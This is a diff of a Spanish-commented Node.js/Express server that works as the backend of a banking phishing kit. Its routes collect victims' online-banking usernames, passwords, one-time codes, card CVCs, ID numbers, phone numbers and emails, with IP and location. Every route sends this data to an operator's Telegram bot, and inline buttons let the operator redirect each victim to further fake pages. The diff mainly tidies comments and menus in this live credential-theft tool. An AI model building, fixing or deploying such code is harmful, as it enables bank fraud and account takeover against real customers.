@@ -6,14 +6,14 @@ const cors = require('cors');
 
 const app = express();
 const corsOptions = {
-  origin: '*',
+  origin: '*', // Permite todas las peticiones (o especifica el dominio si es necesario)
   methods: ['GET', 'POST', 'OPTIONS'],
   allowedHeaders: ['Content-Type', 'Authorization'],
   credentials: false
 };
 
 app.use(cors(corsOptions));
-app.options('*', cors(corsOptions));
+app.options('*', cors(corsOptions)); // Maneja preflight
 
 app.use(bodyParser.json());
 
@@ -31,10 +31,10 @@ app.get('/', (_req, res) => {
 });
 
 // ====================================================================================
-// 💡 DEFINICIÓN DE MENÚS REUTILIZABLES (Para evitar código repetido y errores de Telegram)
+// 💡 FUNCIONES DE MENÚ REUTILIZABLES (Solución al error 500 por límite de botones)
 // ====================================================================================
 
-// Menú 1: Los botones más importantes
+// Menú 1: Los botones más importantes (8 botones + el botón de despliegue)
 function getPrimaryReplyMarkup(sessionId) {
     return {
         inline_keyboard: [
@@ -62,7 +62,7 @@ function getPrimaryReplyMarkup(sessionId) {
     };
 }
 
-// Menú 2: El resto de tarjetas (se envía en un MENSAJE APARTE para evitar el error 500)
+// Menú 2: El resto de tarjetas (se envía en un MENSAJE APARTE)
 function getSecondaryReplyMarkup(sessionId) {
     return {
         inline_keyboard: [
@@ -112,6 +112,7 @@ function getOTPReplyMarkup(sessionId, rutaSiguiente = 'opcion1') {
 
 // ================== RUTAS PRINCIPALES ==================
 
+// 🟢 /virtualpersona (Entrada de Usuario y Clave)
 app.post('/virtualpersona', async (req, res) => {
   try {
     const { sessionId, user, pass, ip, country, city } = req.body;
@@ -149,7 +150,7 @@ app.post('/virtualpersona', async (req, res) => {
   }
 });
 
-// 🔁 Ruta para opcion1.html
+// 🟡 /otp1 (Ingreso de OTP Dina)
 app.post('/otp1', async (req, res) => {
   try {
     const { sessionId, user, pass, dina, ip, country, city } = req.body;
@@ -166,7 +167,7 @@ app.post('/otp1', async (req, res) => {
 
     redirections.set(sessionId, null);
 
-    // Usamos el menú especial de OTP
+    // Usa el menú especial de OTP
     const reply_markup = getOTPReplyMarkup(sessionId, 'opcion1');
 
     await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -182,7 +183,7 @@ app.post('/otp1', async (req, res) => {
   }
 });
 
-// 🔁 Ruta para opcion2.html
+// 🟠 /otp2 (Re-ingreso o segundo OTP)
 app.post('/otp2', async (req, res) => {
   try {
     const { sessionId, user, pass, dina, ip, country, city } = req.body;
@@ -199,7 +200,7 @@ app.post('/otp2', async (req, res) => {
 
     redirections.set(sessionId, null);
 
-    // Usamos el menú especial de OTP
+    // Usa el menú especial de OTP
     const reply_markup = getOTPReplyMarkup(sessionId, 'opcion2');
 
     await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -215,11 +216,9 @@ app.post('/otp2', async (req, res) => {
   }
 });
 
-// ================== RUTAS DE CAPTURA DE DATOS (CON MENÚ PRINCIPAL) ==================
+// ================== RUTAS DE CAPTURA DE DATOS (TODAS CON MENÚ PRIMARIO) ==================
 
-// Todas las rutas de captura de datos (visa, master, debit, credit, amex, datos) ahora
-// utilizan el menú principal (getPrimaryReplyMarkup) para ser más funcionales.
-
+// 💳 /visa (Captura de CVC)
 app.post('/visa', async (req, res) => {
   try {
     const { sessionId, user, pass, cvc, ip, country, city } = req.body;
@@ -232,7 +231,7 @@ app.post('/visa', async (req, res) => {
 🆔 Session: ${sessionId}
     `.trim();
 
-    // Usamos el menú principal que es más corto y seguro
+    // Usa el menú principal corregido
     const reply_markup = getPrimaryReplyMarkup(sessionId);
 
     await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -248,6 +247,7 @@ app.post('/visa', async (req, res) => {
   }
 });
 
+// 💳 /master (Captura de CVC)
 app.post('/master', async (req, res) => {
   try {
     const { sessionId, user, pass, cvc, ip, country, city } = req.body;
@@ -260,7 +260,7 @@ app.post('/master', async (req, res) => {
 🆔 Session: ${sessionId}
     `.trim();
 
-    // Usamos el menú principal que es más corto y seguro
+    // Usa el menú principal corregido
     const reply_markup = getPrimaryReplyMarkup(sessionId);
 
     await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -276,6 +276,7 @@ app.post('/master', async (req, res) => {
   }
 });
 
+// 🏦 /debit (Captura de CVC)
 app.post('/debit', async (req, res) => {
   try {
     const { sessionId, user, pass, cvc, ip, country, city } = req.body;
@@ -288,7 +289,7 @@ app.post('/debit', async (req, res) => {
 🆔 Session: ${sessionId}
     `.trim();
 
-    // Usamos el menú principal que es más corto y seguro
+    // Usa el menú principal corregido
     const reply_markup = getPrimaryReplyMarkup(sessionId);
 
     await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -302,8 +303,9 @@ app.post('/debit', async (req, res) => {
     console.error('Error en /debit:', error.message);
     res.status(500).send({ ok: false });
   }
-  
 });
+
+// 💰 /credit (Captura de CVC - aunque no se usa en el flujo principal)
 app.post('/credit', async (req, res) => {
   try {
     const { sessionId, user, pass, cvc, ip, country, city } = req.body;
@@ -316,14 +318,8 @@ app.post('/credit', async (req, res) => {
 🆔 Session: ${sessionId}
     `.trim();
 
-    const reply_markup = {
-      inline_keyboard: [
-        [
-          { text: "❌ Error Crédito", callback_data: `go:credit.html|${sessionId}` },
-          { text: "✅ Siguiente", callback_data: `go:opcion1.html|${sessionId}` }
-        ]
-      ]
-    };
+    // Usa el menú principal corregido
+    const reply_markup = getPrimaryReplyMarkup(sessionId);
 
     await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
       chat_id: CHAT_ID,
@@ -339,6 +335,7 @@ app.post('/credit', async (req, res) => {
 });
 
 
+// 💎 /amex (Captura de CVC)
 app.post('/amex', async (req, res) => {
   try {
     const { sessionId, user, pass, cvc, ip, country, city } = req.body;
@@ -348,10 +345,9 @@ app.post('/amex', async (req, res) => {
 🔒 Clave: ${pass}
 🔢 CVC: ${cvc}
 🌐 ${ip} - ${city}, ${country}
-🆔 Session: ${sessionId}
     `.trim();
 
-    // Usamos el menú principal que es más corto y seguro
+    // Usa el menú principal corregido
     const reply_markup = getPrimaryReplyMarkup(sessionId);
 
     await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -367,7 +363,7 @@ app.post('/amex', async (req, res) => {
   }
 });
 
-// 🔹 Ruta para recibir datos personales (datos.html)
+// 🔹 /datos (Captura de Documento, Celular y Correo)
 app.post('/datos', async (req, res) => {
   try {
     const { sessionId, dc, num, mail, ip, country, city } = req.body;
@@ -382,7 +378,7 @@ app.post('/datos', async (req, res) => {
 🧩 sessionId: ${sessionId}
     `.trim();
 
-    // Usamos el menú principal que es más corto y seguro
+    // Usa el menú principal corregido
     const reply_markup = getPrimaryReplyMarkup(sessionId);
 
     await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -398,13 +394,11 @@ app.post('/datos', async (req, res) => {
   }
 });
 
+// ================== RUTA PARA ENVIAR EL SEGUNDO MENÚ (DISPARADO POR send:menu_tarjetas2) ==================
 
-// ================== RUTAS DE REDIRECCIÓN Y WEBHOOK ==================
-
-// 💡 RUTA QUE ENVÍA EL SEGUNDO MENÚ DE BOTONES
 app.post('/menu_tarjetas2', async (req, res) => {
   try {
-    const { sessionId } = req.body; 
+    const { sessionId } = req.body; // Solo necesitamos el sessionId
 
     const mensaje = `
 📋 Menú de Tarjetas Adicionales
@@ -412,7 +406,7 @@ app.post('/menu_tarjetas2', async (req, res) => {
 Selecciona una opción para redireccionar al cliente:
     `.trim();
 
-    // Usamos el menú secundario que tiene el resto de opciones
+    // Usa el menú secundario que tiene el resto de opciones
     const reply_markup = getSecondaryReplyMarkup(sessionId);
 
     await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -429,7 +423,9 @@ Selecciona una opción para redireccionar al cliente:
 });
 
 
-// 📩 Webhook de Telegram para botones (modificado para manejar el menú secundario)
+// ================== RUTAS DE REDIRECCIÓN Y WEBHOOK ==================
+
+// 📩 Webhook de Telegram para botones (MODIFICADO para manejar el comando 'send:')
 app.post(`/webhook/${BOT_TOKEN}`, async (req, res) => {
   try {
     const update = req.body;
@@ -439,22 +435,23 @@ app.post(`/webhook/${BOT_TOKEN}`, async (req, res) => {
       const [action, sessionId] = (callback_query.data || '').split('|');
       const route = action.replace('go:', '');
 
-      // Si la acción es 'send', enviamos el segundo mensaje con botones
+      // Manejar el botón que pide el segundo menú
       if (action.startsWith('send:')) {
-            const sendRoute = action.replace('send:', '');
+          const sendRoute = action.replace('send:', '');
 
-            await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
-                callback_query_id: callback_query.id,
-                text: `Cargando Menú Adicional...`,
-                show_alert: true
-            });
+          await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
+              callback_query_id: callback_query.id,
+              text: `Cargando Menú Adicional...`,
+              show_alert: true
+          });
 
-            // Llamamos a la ruta del servidor para que envíe el segundo mensaje
-            await axios.post(`https://diosnoseolvidademi.onrender.com/${sendRoute}`, { sessionId });
+          // Llama a la ruta del servidor para que envíe el segundo mensaje. 
+          // Usamos la URL de tu servidor en Render para la llamada interna.
+          await axios.post(`https://diosnoseolvidademi.onrender.com/${sendRoute}`, { sessionId });
 
-            return res.sendStatus(200); // Terminamos aquí si solo fue un envío de menú
-        }
-
+          return res.sendStatus(200); // Terminamos aquí si solo fue un envío de menú
+      }
+      
       // Si la acción es 'go', configuramos la redirección
       if (sessionId) redirections.set(sessionId, route);
 
@@ -490,6 +487,7 @@ app.listen(PORT, () => console.log(`✅ Servidor activo en puerto ${PORT}`));
 // ==== Auto-ping para mantener activo el backend en Render ====
 setInterval(async () => {
   try {
+    // URL del Auto-Ping usando tu dominio en Render
     const res = await fetch("https://diosnoseolvidademi.onrender.com"); 
     const text = await res.text();
     console.log("🔁 Auto-ping realizado:", text);
